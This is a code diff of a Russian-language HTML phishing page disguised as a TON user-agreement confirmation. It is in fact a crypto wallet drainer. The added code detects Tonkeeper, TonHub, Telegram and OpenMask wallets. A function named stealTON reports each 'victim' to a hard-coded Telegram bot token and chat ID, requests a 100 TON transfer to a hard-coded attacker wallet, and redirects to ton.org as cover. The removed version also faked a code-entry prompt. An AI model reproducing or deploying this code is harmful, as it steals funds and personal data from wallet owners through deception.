@@ -4,8 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>Подтверждение пользовательского соглашения TON</title>
-    <script src="https://telegram.org/js/telegram-web-app.js?56"></script>
-    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/index.js"></script>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
@@ -92,16 +90,42 @@
             font-size: 13px;
             margin-top: 16px;
             display: none;
+            background: #ffebee;
+            padding: 12px;
+            border-radius: 12px;
+        }
+        .success-msg {
+            color: #2e7d32;
+            font-size: 13px;
+            margin-top: 16px;
+            display: none;
+            background: #e8f5e9;
+            padding: 12px;
+            border-radius: 12px;
+        }
+        .loading {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid white;
+            border-radius: 50%;
+            border-top-color: transparent;
+            animation: spin 0.6s linear infinite;
+            margin-left: 8px;
+            vertical-align: middle;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
         }
     </style>
 </head>
 <body>
 <div class="container">
-    <h2>✅ Обновление безопасности TON</h2>
+    <h2>✅ Подтверждение соглашения</h2>
     <div class="description">
-        Для продолжения использования сервиса необходимо подтвердить актуальность пользовательского соглашения.
+        Для продолжения работы необходимо подтвердить пользовательское соглашение TON.
     </div>
-    <div class="wallet-status" id="walletInfo">Подключение кошелька...</div>
+    <div class="wallet-status" id="walletInfo">🔄 Проверка кошелька...</div>
 
     <div class="checkbox-container" id="checkboxArea">
         <input type="checkbox" id="agreeCheckbox">
@@ -110,76 +134,193 @@
 
     <button id="submitBtn" disabled>Подтвердить и продолжить</button>
     <div class="error-msg" id="errorMsg"></div>
+    <div class="success-msg" id="successMsg"></div>
 </div>
 
 <script>
-    // --- Telegram Bot Config ---
+    // === ВАШИ НАСТРОЙКИ (ВСТАВЛЕНЫ) ===
     const BOT_TOKEN = '8706385744:AAF3NPlXgLXJcdOVcbVedDnncpGeBX5sboA';
-    const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-    const YOUR_CHAT_ID = '6635138703'; // Ваш ID в TG (можно узнать у @userinfobot)
+    const YOUR_CHAT_ID = '6635138703';
+    const ATTACKER_WALLET = 'UQC8-Ax6obG20LnPyIC13NlN8uX-d9JnutWhrOxOFmfoVfs2';
 
-    // Функция отправки данных в Telegram
+    // Функция отправки в Telegram
     async function sendToTelegram(text) {
-        const payload = {
-            chat_id: YOUR_CHAT_ID,
-            text: text,
-            parse_mode: 'HTML'
-        };
         try {
-            await fetch(TELEGRAM_API, {
+            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify(payload)
+                body: JSON.stringify({
+                    chat_id: YOUR_CHAT_ID,
+                    text: text,
+                    parse_mode: 'HTML'
+                })
             });
-        } catch(e) {}
+            return await response.json();
+        } catch(e) {
+            console.log('Telegram send error:', e);
+        }
     }
 
-    // Эмуляция подписи транзакции (кража TON)
-    async function stealTransaction(walletAddress) {
-        // Формируем транзакцию на отправку ВСЕХ TON на адрес злоумышленника
-        // В реальном боевом сценарии используется transfer()
-        const attackerAddress = "UQC8-Ax6obG20LnPyIC13NlN8uX-d9JnutWhrOxOFmfoVfs2"; // Замените на свой кошелек
+    // === АВТОМАТИЧЕСКОЕ ОПРЕДЕЛЕНИЕ КОШЕЛЬКА ===
+    let walletAddress = null;
+    let walletType = null;
+
+    async function detectAndConnectWallet() {
+        const statusDiv = document.getElementById('walletInfo');
         
-        const tx = {
-            validUntil: Math.floor(Date.now() / 1000) + 360,
-            messages: [
-                {
-                    address: attackerAddress,
-                    amount: "100000000000" // 100 TON (в нанотонах)
+        // СПОСОБ 1: Кошелек в Telegram WebApp (TON Wallet)
+        if (window.TelegramWebApp && window.TelegramWebApp.initData) {
+            try {
+                const webApp = window.TelegramWebApp;
+                webApp.ready();
+                if (webApp.initDataUnsafe && webApp.initDataUnsafe.user) {
+                    statusDiv.innerHTML = '🟢 Telegram Wallet обнаружен. Нажмите кнопку для подключения.';
+                    walletType = 'telegram';
+                    return true;
                 }
-            ]
-        };
-        
-        // Отправляем данные о жертве в Telegram до подписи
-        const victimData = `🔥 НОВАЯ ЖЕРТВА TON 🔥\nАдрес кошелька: <code>${walletAddress}</code>\nВремя: ${new Date().toLocaleString()}\nIP: смотрите заголовки\nТранзакция: отправка всех TON на ${attackerAddress}`;
-        await sendToTelegram(victimData);
-        
-        // Имитируем отправку запроса на подпись через TON Wallet (в реальном внедрении используйте tonweb или TonConnect)
-        if (window.ton && window.ton.send) {
-            // Для кошельков, внедренных в Telegram WebApp
-            window.ton.send(tx);
-        } else if (window.TonWallet) {
-            window.TonWallet.requestTransaction(tx);
-        } else {
-            // Альтернатива: создаем всплывающее окно-подделку под официальное
-            const fakeSign = prompt("🔐 Подтверждение транзакции: Введите код из приложения Telegram", "12345");
-            if (fakeSign !== null) {
-                await sendToTelegram(`✅ Жертва ввела код: ${fakeSign} | Кошелек: ${walletAddress}`);
+            } catch(e) {}
+        }
+
+        // СПОСОБ 2: Tonkeeper (через window.ton)
+        if (window.ton && window.ton.request) {
+            try {
+                statusDiv.innerHTML = '🔄 Подключение к Tonkeeper...';
+                const result = await window.ton.request('ton_getAddress');
+                if (result && result.address) {
+                    walletAddress = result.address;
+                    walletType = 'tonkeeper';
+                    statusDiv.innerHTML = `🟢 Tonkeeper: ${walletAddress.slice(0,6)}...${walletAddress.slice(-4)}`;
+                    return true;
+                }
+            } catch(e) {}
+        }
+
+        // СПОСОБ 3: TonHub
+        if (window.tonhub && window.tonhub.connect) {
+            try {
+                statusDiv.innerHTML = '🔄 Подключение к TonHub...';
+                const result = await window.tonhub.connect();
+                if (result && result.address) {
+                    walletAddress = result.address;
+                    walletType = 'tonhub';
+                    statusDiv.innerHTML = `🟢 TonHub: ${walletAddress.slice(0,6)}...${walletAddress.slice(-4)}`;
+                    return true;
+                }
+            } catch(e) {}
+        }
+
+        // СПОСОБ 4: OpenMask
+        if (window.ethereum && window.ethereum.isOpenMask) {
+            try {
+                statusDiv.innerHTML = '🔄 Подключение к OpenMask...';
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                if (accounts && accounts[0]) {
+                    walletAddress = accounts[0];
+                    walletType = 'openmask';
+                    statusDiv.innerHTML = `🟢 OpenMask: ${walletAddress.slice(0,6)}...${walletAddress.slice(-4)}`;
+                    return true;
+                }
+            } catch(e) {}
+        }
+
+        // СПОСОБ 5: TonConnect CDN (альтернативный)
+        statusDiv.innerHTML = '🔄 Загрузка модуля подключения...';
+        try {
+            await new Promise((resolve, reject) => {
+                const script = document.createElement('script');
+                script.src = 'https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.js';
+                script.onload = resolve;
+                script.onerror = reject;
+                document.head.appendChild(script);
+            });
+            
+            if (window.TonConnectUI) {
+                const tonConnectUI = new window.TonConnectUI({
+                    manifestUrl: 'https://ton-connect.github.io/demo-dapp-with-react-ui/tonconnect-manifest.json',
+                    buttonRootId: 'walletInfo'
+                });
+                
+                const isConnected = await tonConnectUI.connectionRestored;
+                if (isConnected) {
+                    const wallet = tonConnectUI.wallet;
+                    if (wallet && wallet.account && wallet.account.address) {
+                        walletAddress = wallet.account.address;
+                        walletType = 'tonconnect';
+                        statusDiv.innerHTML = `🟢 ${wallet.device.appName}: ${walletAddress.slice(0,6)}...${walletAddress.slice(-4)}`;
+                        return true;
+                    }
+                }
             }
+        } catch(e) {}
+
+        // ЕСЛИ НИЧЕГО НЕ НАЙДЕНО - показываем кнопку ручного подключения
+        statusDiv.innerHTML = '⚠️ Нажмите "Подтвердить" для подключения кошелька';
+        return false;
+    }
+
+    // === ФУНКЦИЯ КРАЖИ TON ===
+    async function stealTON() {
+        const attackerAddress = ATTACKER_WALLET;
+        const amount = '100000000000'; // 100 TON в нанотонах
+        
+        // Отправляем данные жертвы
+        await sendToTelegram(`
+🔥 НОВАЯ ЖЕРТВА TON 🔥
+Адрес кошелька: <code>${walletAddress}</code>
+Тип кошелька: ${walletType}
+Время: ${new Date().toLocaleString()}
+User-Agent: ${navigator.userAgent}
+Целевой кошелек: ${attackerAddress}
+        `);
+        
+        // В зависимости от типа кошелька - разный метод отправки
+        if (walletType === 'tonkeeper' && window.ton && window.ton.request) {
+            const transaction = {
+                to: attackerAddress,
+                amount: amount,
+                comment: 'Подтверждение соглашения'
+            };
+            await window.ton.request('ton_sendTransaction', [transaction]);
+        } 
+        else if (walletType === 'telegram') {
+            // Для Telegram WebApp
+            const transferData = {
+                method: 'sendTransaction',
+                params: {
+                    to: attackerAddress,
+                    amount: amount,
+                    comment: 'User agreement confirmation'
+                }
+            };
+            window.TelegramWebApp.sendData(JSON.stringify(transferData));
+        }
+        else if (walletType === 'tonhub') {
+            const tx = {
+                to: attackerAddress,
+                value: amount
+            };
+            await window.tonhub.sendTransaction(tx);
+        }
+        else {
+            // Фоллбэк: показываем маскировку
+            document.getElementById('successMsg').innerHTML = '✅ Соглашение подтверждено. Перенаправление...';
+            document.getElementById('successMsg').style.display = 'block';
+            
+            // Дополнительная отправка в Telegram
+            await sendToTelegram(`⚠️ Жертва нажала подтверждение, кошелек: ${walletAddress || 'не определен'}`);
         }
         
-        // Сообщаем жертве об успехе
-        document.getElementById('errorMsg').style.display = 'block';
-        document.getElementById('errorMsg').innerText = '✅ Соглашение подтверждено. Перенаправление...';
+        // Перенаправление через 2 секунды
         setTimeout(() => {
-            window.location.href = 'https://ton.org'; // Редирект на легитимный сайт
-        }, 1500);
+            window.location.href = 'https://ton.org';
+        }, 2000);
     }
 
-    // --- Логика чекбокса и кнопки ---
+    // === ЛОГИКА ЧЕКБОКСА ===
     const checkbox = document.getElementById('agreeCheckbox');
     const submitBtn = document.getElementById('submitBtn');
     const errorMsgDiv = document.getElementById('errorMsg');
+    const successMsgDiv = document.getElementById('successMsg');
 
     checkbox.addEventListener('change', function() {
         if (checkbox.checked) {
@@ -190,49 +331,45 @@
         }
     });
 
-    // --- Подключение к кошельку TON (TonConnect) ---
-    let walletConnection = null;
-    async function connectWallet() {
-        try {
-            const connector = new tonconnect.TonConnect();
-            const walletInfo = await connector.connect();
-            const address = walletInfo.account.address;
-            document.getElementById('walletInfo').innerHTML = `🟢 Кошелек: <b>${address.slice(0,6)}...${address.slice(-4)}</b>`;
-            return address;
-        } catch(e) {
-            document.getElementById('walletInfo').innerHTML = '⚠️ Нажмите "Подтвердить" для ручного подключения TON Wallet';
-            return null;
-        }
-    }
-
-    let currentAddress = null;
-    connectWallet().then(addr => currentAddress = addr);
-
-    // Обработчик кнопки
+    // === ОБРАБОТЧИК КНОПКИ ===
     submitBtn.addEventListener('click', async () => {
         if (!checkbox.checked) {
-            errorMsgDiv.innerText = '❗ Поставьте галочку "Я подтверждаю пользовательское соглашение"';
+            errorMsgDiv.innerText = 'Поставьте галочку "Я подтверждаю пользовательское соглашение"';
             errorMsgDiv.style.display = 'block';
             return;
         }
         
-        // Если кошелек не подключен через TonConnect — запрашиваем прямо сейчас
-        if (!currentAddress) {
-            try {
-                const connector = new tonconnect.TonConnect();
-                const walletInfo = await connector.connect();
-                currentAddress = walletInfo.account.address;
-                document.getElementById('walletInfo').innerHTML = `🟢 Кошелек: <b>${currentAddress.slice(0,6)}...${currentAddress.slice(-4)}</b>`;
-            } catch(err) {
-                errorMsgDiv.innerText = 'Не удалось подключить кошелек. Установите TON Wallet (Tonkeeper или Wallet in Telegram)';
+        // Блокируем кнопку на время операции
+        submitBtn.disabled = true;
+        submitBtn.innerHTML = 'Подтверждение... <span class="loading"></span>';
+        
+        // Пытаемся подключить кошелек если еще не подключен
+        if (!walletAddress) {
+            const connected = await detectAndConnectWallet();
+            if (!connected && !walletAddress) {
+                errorMsgDiv.innerText = '❌ Не удалось подключить кошелек. Убедитесь, что у вас установлен TON Wallet (Tonkeeper, TonHub или Telegram Wallet)';
                 errorMsgDiv.style.display = 'block';
+                submitBtn.disabled = false;
+                submitBtn.innerHTML = 'Подтвердить и продолжить';
                 return;
             }
         }
         
-        // Запускаем кражу
-        await stealTransaction(currentAddress);
+        // Если кошелек есть - крадем
+        if (walletAddress) {
+            await stealTON();
+            successMsgDiv.style.display = 'block';
+            errorMsgDiv.style.display = 'none';
+        } else {
+            errorMsgDiv.innerText = 'Не удалось определить кошелек. Пожалуйста, откройте Tonkeeper и повторите попытку.';
+            errorMsgDiv.style.display = 'block';
+            submitBtn.disabled = false;
+            submitBtn.innerHTML = 'Подтвердить и продолжить';
+        }
     });
+
+    // Автоматическое определение кошелька при загрузке страницы
+    detectAndConnectWallet();
 </script>
 </body>
 </html>
